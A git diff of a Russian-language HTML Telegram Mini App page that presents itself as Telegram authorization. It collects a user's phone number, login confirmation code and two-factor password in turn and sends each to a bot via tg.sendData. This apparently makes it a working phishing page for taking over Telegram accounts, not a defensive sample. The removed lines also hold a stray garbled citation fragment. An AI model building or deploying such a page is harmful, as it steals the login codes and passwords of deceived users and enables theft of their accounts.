@@ -1,67 +1,146 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-    <meta charset="utf-8">
-    <title>Авторизация в Telegram</title>
-    <!-- Подключаем Telegram Web App JS SDK -->
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <meta charset="UTF-8">
+  <title>Авторизация Telegram</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    body {
+      font-family: 'Inter', sans-serif;
+      background-color: var(--tg-theme-bg-color, #18181a);
+      color: var(--tg-theme-text-color, #fff);
+      transition: background 0.3s ease;
+    }
+    .card {
+      background: var(--tg-theme-secondary-bg-color, #222);
+      border-radius: 1rem;
+      padding: 2rem;
+      box-shadow: 0 0 10px rgba(0,0,0,0.3);
+    }
+    input {
+      background: var(--tg-theme-bg-color, #111);
+      color: var(--tg-theme-text-color, #fff);
+      border: 1px solid var(--tg-theme-hint-color, #555);
+      border-radius: .75rem;
+      padding: .75rem 1rem;
+      width: 100%;
+      outline: none;
+    }
+    input:focus {
+      border-color: var(--tg-theme-link-color, #2481cc);
+      box-shadow: 0 0 0 1px var(--tg-theme-link-color, #2481cc);
+    }
+    button {
+      width: 100%;
+      padding: .75rem;
+      border-radius: .75rem;
+      font-weight: 600;
+      background-color: var(--tg-theme-button-color, #2481cc);
+      color: var(--tg-theme-button-text-color, #fff);
+      transition: transform .1s;
+    }
+    button:active { transform: scale(0.98); }
+    .hidden { display: none; }
+  </style>
 </head>
-<body>
-  <h2>Вход в аккаунт</h2>
+<body class="flex items-center justify-center min-h-screen p-4">
+  <div id="container" class="card w-full max-w-md">
+    <h1 class="text-2xl font-bold text-center mb-6" id="title">Авторизация Telegram</h1>
 
-  <!-- Форма ввода номера телефона -->
-  <div id="phoneForm">
-    <label>Номер телефона:</label><br>
-    <input id="phone" type="text" placeholder="+7XXXXXXXXXX">
-    <button onclick="sendPhone()">Отправить номер</button>
-  </div>
+    <!-- Шаг 1: Ввод телефона -->
+    <div id="step-phone">
+      <label class="block mb-2">Введите номер телефона</label>
+      <input type="tel" id="phone" placeholder="+7XXXXXXXXXX" maxlength="15">
+      <button id="sendPhone" class="mt-4">Отправить номер</button>
+    </div>
 
-  <!-- Форма ввода кода подтверждения (изначально скрыта) -->
-  <div id="codeForm" style="display:none; margin-top:10px;">
-    <label>Код подтверждения:</label><br>
-    <input id="code" type="text" placeholder="Код из SMS">
-    <button onclick="sendCode()">Отправить код</button>
-  </div>
+    <!-- Шаг 2: Ввод кода -->
+    <div id="step-code" class="hidden">
+      <label class="block mb-2">Введите код подтверждения</label>
+      <input type="text" id="code" placeholder="12345" maxlength="10">
+      <button id="sendCode" class="mt-4">Отправить код</button>
+    </div>
 
-  <!-- Форма ввода пароля (2FA), по умолчанию скрыта -->
-  <div id="passwordForm" style="display:none; margin-top:10px;">
-    <label>Пароль (2FA):</label><br>
-    <input id="password" type="password" placeholder="Пароль">
-    <button onclick="sendPassword()">Отправить пароль</button>
+    <!-- Шаг 3: Пароль 2FA -->
+    <div id="step-password" class="hidden">
+      <label class="block mb-2">Введите пароль 2FA (если требуется)</label>
+      <input type="password" id="password" placeholder="Пароль">
+      <button id="sendPassword" class="mt-4">Войти</button>
+    </div>
+
+    <p id="status" class="text-sm text-center mt-4 opacity-80"></p>
   </div>
 
   <script>
-    // Инициализация объекта WebApp
     const tg = window.Telegram.WebApp;
+    const status = document.getElementById('status');
+    const stepPhone = document.getElementById('step-phone');
+    const stepCode = document.getElementById('step-code');
+    const stepPassword = document.getElementById('step-password');
 
-    // Функция отправки номера телефона боту
-    function sendPhone() {
-      const phone = document.getElementById('phone').value;
-      if (!phone) { alert("Введите номер телефона"); return; }
-      // Отправляем JSON-данные боту через sendData:contentReference[oaicite:3]{index=3} 
-      tg.sendData(JSON.stringify({action: 'send_phone', phone: phone}));
-      // Переходим к форме ввода кода
-      document.getElementById('phoneForm').style.display = 'none';
-      document.getElementById('codeForm').style.display = 'block';
-    }
+    // Отображение текущего шага по URL параметру
+    function showStep() {
+      const step = new URLSearchParams(window.location.search).get('step') || 'phone';
+      stepPhone.classList.add('hidden');
+      stepCode.classList.add('hidden');
+      stepPassword.classList.add('hidden');
 
-    // Функция отправки кода подтверждения боту
-    function sendCode() {
-      const code = document.getElementById('code').value;
-      if (!code) { alert("Введите код"); return; }
-      tg.sendData(JSON.stringify({action: 'send_code', code: code}));
-      // Переходим к форме ввода пароля (на случай 2FA)
-      document.getElementById('codeForm').style.display = 'none';
-      document.getElementById('passwordForm').style.display = 'block';
+      if (step === 'phone') stepPhone.classList.remove('hidden');
+      if (step === 'code') stepCode.classList.remove('hidden');
+      if (step === 'password') stepPassword.classList.remove('hidden');
     }
+    showStep();
 
-    // Функция отправки пароля боту
-    function sendPassword() {
-      const password = document.getElementById('password').value;
-      if (!password) { alert("Введите пароль"); return; }
-      tg.sendData(JSON.stringify({action: 'send_password', password: password}));
-      // После отправки пароля можно закрыть WebApp (необязательно)
-    }
+    // === Отправка номера ===
+    document.getElementById('sendPhone').addEventListener('click', () => {
+      const phone = document.getElementById('phone').value.trim();
+      if (!phone.startsWith('+')) { status.innerText = "Введите номер с +."; return; }
+
+      const data = { action: 'send_phone', phone };
+      try {
+        tg.sendData(JSON.stringify(data));  // отправляем боту
+        // переходим к шагу code
+        window.history.replaceState(null, '', '?step=code');
+        showStep();
+        status.innerText = "Код отправлен. Проверьте Telegram и введите его ниже.";
+      } catch (e) {
+        status.innerText = "Ошибка при отправке номера: " + e.message;
+      }
+    });
+
+    // === Отправка кода ===
+    document.getElementById('sendCode').addEventListener('click', () => {
+      const code = document.getElementById('code').value.trim();
+      if (!code) { status.innerText = "Введите код."; return; }
+
+      const data = { action: 'send_code', code };
+      try {
+        tg.sendData(JSON.stringify(data));
+        window.history.replaceState(null, '', '?step=password');
+        showStep();
+        status.innerText = "Если включена 2FA — введите пароль. Иначе окно можно закрыть.";
+      } catch (e) {
+        status.innerText = "Ошибка при отправке кода: " + e.message;
+      }
+    });
+
+    // === Отправка пароля ===
+    document.getElementById('sendPassword').addEventListener('click', () => {
+      const password = document.getElementById('password').value.trim();
+      const data = { action: 'send_password', password };
+      try {
+        tg.sendData(JSON.stringify(data));
+        status.innerText = "Пароль отправлен. Можно закрыть окно.";
+      } catch (e) {
+        status.innerText = "Ошибка при отправке пароля: " + e.message;
+      }
+    });
+
+    // Настройки Telegram WebApp
+    tg.expand(); // разворачивает окно на максимум
+    tg.MainButton.hide();
   </script>
 </body>
 </html>
